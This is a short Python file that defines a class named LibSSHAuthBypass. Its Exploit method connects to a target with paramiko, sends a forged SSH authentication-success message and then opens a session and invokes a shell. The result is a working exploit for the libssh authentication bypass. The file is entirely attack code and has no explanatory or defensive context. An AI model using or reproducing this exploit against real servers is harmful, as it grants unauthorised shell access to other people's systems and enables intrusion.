import paramiko, socket

class LibSSHAuthBypass:
    @staticmethod
    def Exploit(host:str, port:int):
        sock = socket.socket()

        try:
            sock.connect((host, port))

            message = paramiko.message.Message()
            transport = paramiko.transport.Transport(sock)
            transport.start_client()

            message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
            transport._send_message(message)

            spawncmd = transport.open_session()
            spawncmd.invoke_shell()

            return True
            
        except:
            return False

